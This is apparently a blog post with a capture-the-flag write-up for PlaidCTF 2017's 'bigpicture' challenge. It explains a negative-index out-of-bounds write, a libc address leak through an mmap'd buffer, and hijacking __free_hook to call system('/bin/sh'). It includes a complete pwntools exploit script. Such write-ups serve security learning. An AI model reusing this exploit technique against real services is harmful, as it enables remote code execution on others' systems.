<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>PlaidCTF 2017: bigpicture (pwn 200) | Isaac's Blog</title><link rel="canonical" href="https://poning.me/2017/04/28/bigpicture/"/><link rel="stylesheet" type="text/css" href="/css/normalize.css"><link rel="stylesheet" type="text/css" href="/css/very-simple.css"><link rel="stylesheet" type="text/css" href="/css/solarized-dark.css"><link rel="stylesheet" type="text/css" href="/css/my.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/font-awesome/4.5.0/css/font-awesome.min.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><!-- include the sidebar--><!-- include ./includes/sidebar.jade--><!-- Blog title and subtitle--><header><div class="container header"><a id="logo" href="/." class="title">Isaac's Blog</a><span class="subtitle">The force is with those who read the source.</span><label id="toggle-menu" for="menu" onclick><i class="fa fa-bars"></i></label></div></header><!-- use checkbox hack for toggle nav-bar on small screens--><input id="menu" type="checkbox"><!-- Navigation Links--><nav id="nav"><div class="container"><a href="/" class="sidebar-nav-item active">Home</a><a href="/archives/" class="sidebar-nav-item">Archives</a><a href="/about/" class="sidebar-nav-item">About</a></div></nav><div id="header-margin-bar"></div><!-- gallery that comes before the header--><div class="wrapper"><div class="container post-header"><h1>PlaidCTF 2017: bigpicture (pwn 200)</h1></div></div><div class="wrapper"><div class="container meta"><div class="post-time">2017-04-28</div><div class="post-categories"><a class="post-category-link" href="/categories/writeup/">writeup</a></div><div class="post-tags"><a class="post-tag-link" href="/tags/ASLR/">ASLR</a>/<a class="post-tag-link" href="/tags/libc-hook/">libc hook</a>/<a class="post-tag-link" href="/tags/pwn/">pwn</a></div></div></div><article><div class="container post"><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>Size matters!<br>Running at bigpicture.chal.pwning.xxx:420<br><a href="/2017/04/28/bigpicture/bigpicture_0b8eed37d9a4e5073456306e6eb0672c.tgz" title="Download">Download</a></p>
</blockquote>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>Request a large buffer which will be allocated at somewhere after the libc pages.</li>
<li>The offset between the buffer and the libc is fixed.</li>
<li>Use negative indexes to leak the base address of the libc.</li>
<li>Set <code>__free_hook</code> to <code>system</code>.</li>
<li>Set the content of the buffer to <code>/bin/sh</code>.</li>
<li><code>free(buffer)</code> becomes <code>system(&quot;/bin/sh&quot;)</code>.</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>This challenge comes with a source code <a href="/2017/04/28/bigpicture/bigpicture.c" title="bigpicture.c">bigpicture.c</a>. What it does is, first, allocating a 2D array with the height and the width we choose. Then, we can set the content of any element of the array. If an element has already been set, it will print out its value. Finally, it will draw the 2D array on the exit.</p>
<p>The vulnerability is that the index of the element to be set can be negative.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br></pre></td><td class="code"><pre><span class="hljs-keyword">if</span>(x &gt;= width || y &gt;= height) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"out of bounds!"</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></pre></td></tr></table></figure>
<p>Therefore, we can leak or set the content before the buffer, which is usually in the heap. Next, here comes the essential part of the challenge. If the buffer located in the heap, the only memory pages we can access belong to the main program. Because of the full RELRO protection of this binary, we cannot hijack the control flow through overriding a GOT entry. Even worst, we don’t know the exact offset between the buffer and the main program. However, if we request a large enough buffer (about 128kb), it will be allocated by <code>mmap</code>. This buffer will be placed after the <code>libc.so.6</code>, and the offset between these two memory pages is fixed. So, we can leak the libc address and override the <code>__free_hook</code> to divert the control flow. Now we know why the description said “Size matters!”</p>
<p>My exploit script is as follows.</p>
<figure class="highlight python"><figcaption><span>bigpicture_exp.py</span><a href="/2017/04/28/bigpicture/bigpicture_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>56<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>context.terminal = [<span class="hljs-string">'tmux'</span>, <span class="hljs-string">'splitw'</span>, <span class="hljs-string">'-h'</span>]<br><br><span class="hljs-comment"># remote</span><br>got_offset = <span class="hljs-number">0x12afa8</span><br>free_hook_offset = <span class="hljs-number">0x128868</span><br><br><span class="hljs-comment"># local</span><br>got_offset = <span class="hljs-number">0x130fa8</span><br>free_hook_offset = <span class="hljs-number">0x12e868</span><br><br>libc_offset = <span class="hljs-number">0x1f876</span><br><br>libc = ELF(<span class="hljs-string">'./libc-2.23.so'</span>)<br><br><span class="hljs-comment"># r = process('./bigpicture', env={'LD_PRELOAD': './libc-2.23.so'})</span><br><span class="hljs-comment"># gdb.attach(r, '''</span><br><span class="hljs-comment"># c</span><br><span class="hljs-comment"># ''')</span><br>r = remote(<span class="hljs-string">'bigpicture.chal.pwning.xxx'</span>, <span class="hljs-number">420</span>)<br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'How big? '</span>)<br>r.sendline(<span class="hljs-string">'1000 x 1000'</span>)<br><br><span class="hljs-comment"># leak libc address</span><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>address_in_libc = <span class="hljs-string">''</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):<br>    r.sendline(<span class="hljs-string">'0 , -'</span> + str(got_offset - i) + <span class="hljs-string">' , A'</span>)<br>    data = r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>    <span class="hljs-keyword">print</span> data<br>    address_in_libc += data[<span class="hljs-number">12</span>]<br><br>address_in_libc += <span class="hljs-string">'\x00\x00'</span><br>address_in_libc = u64(address_in_libc)<br>log.critical(<span class="hljs-string">'address in libc: '</span> + hex(address_in_libc))<br>libc.address = address_in_libc - libc_offset<br>log.critical(<span class="hljs-string">'libc base address: '</span> + hex(libc.address))<br>log.critical(<span class="hljs-string">'system address: '</span> + hex(libc.symbols[<span class="hljs-string">'system'</span>]))<br><br><span class="hljs-comment"># override __free_hook to system</span><br><span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> enumerate(p64(libc.symbols[<span class="hljs-string">'system'</span>])[:<span class="hljs-number">6</span>]):<br>    r.sendline(<span class="hljs-string">'0 , -'</span> + str(free_hook_offset - i) + <span class="hljs-string">' , '</span> + byte)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br><br><span class="hljs-comment"># write "/bin/sh" to the buffer to be freed</span><br><span class="hljs-keyword">for</span> i, byte <span class="hljs-keyword">in</span> enumerate(<span class="hljs-string">'/bin/sh'</span>):<br>    r.sendline(<span class="hljs-string">'0 , '</span> + str(i) + <span class="hljs-string">' , '</span> + byte)<br>    <span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br><br><span class="hljs-comment"># trigger free</span><br>r.sendline(<span class="hljs-string">'quit'</span>)<br><br>r.interactive()<br></pre></td></tr></table></figure>
<p>I leak an address in the GOT section of the libc to calculate the base address of the libc. Then, I override <code>__free_hook</code> to <code>system</code> and the content of the buffer to <code>/bin/sh</code>. Now freeing the buffer at the end of the program becomes <code>system(&quot;/bin/sh&quot;)</code>. By the way, the offsets between the buffer and the libc of the remote machine were calculated by leaking some memory content and comparing then with the local one.</p>
<blockquote>
<p>Flag: <code>PCTF{draw_me_like_one_of_your_pwn200s}</code></p>
</blockquote>
<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><ul>
<li><strong>What I’ve learned:</strong><br>I know that the offsets between shared libraries are fixed. Through this challenge, I further confirm that the offsets between <code>mmap</code>ed pages are also fixed.</li>
<li>Some references of ASLR:<ul>
<li><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Marco-Gisbert-Exploiting-Linux-And-PaX-ASLRS-Weaknesses-On-32-And-64-Bit-Systems-wp.pdf" target="_blank" rel="external">Exploiting Linux and PaX ASLR’s weaknesses on 32- and 64-bit systems</a></li>
<li><a href="https://cybersecurity.upv.es/attacks/offset2lib/offset2lib-paper.pdf" target="_blank" rel="external">On the Eﬀectiveness of Full-ASLR on 64-bit Linux</a></li>
</ul>
</li>
</ul>
</div><!-- comment system--><div class="container"><hr><div id="disqus_thread"></div><script type="text/javascript">
var disqus_shortname = 'poning';
var disqus_identifier = '2017/04/28/bigpicture/';
var disqus_title = 'PlaidCTF 2017: bigpicture (pwn 200)';
var disqus_url = 'https://poning.me/2017/04/28/bigpicture/';
(function() {
   var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
   dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
   (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">Blog comments powered by <span class="logo-disqus">Disqus</span></a></div></article><footer id="footer"><div class="container"><div class="bar"><div class="social"><a href="mailto:i@poning.me" target="_blank"><i class="fa fa-envelope-o"></i></a><a href="https://github.com/Isaac0616" target="_blank"><i class="fa fa-github"></i></a><a href="/atom.xml" target="_blank"><i class="fa fa-rss"></i></a></div><div class="footer">© 2017 <a href="/" rel="nofollow">Isaac Tseng</a>. Powered by <a rel="nofollow" target="_blank" href="https://hexo.io">Hexo</a>. Theme <a target="_blank" href="https://github.com/lotabout/very-simple">very-simple</a>.</div></div></div></footer><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css"><script src="//cdn.bootcss.com/jquery/2.0.3/jquery.min.js"></script><script src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script>$(document).ready(function() {
    $(".fancybox").fancybox();
});
</script></body><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
e=o.createElement(i);r=o.getElementsByTagName(i)[0];
e.src='//www.google-analytics.com/analytics.js';
r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
ga('create','UA-86477289-1');ga('send','pageview');</script></html>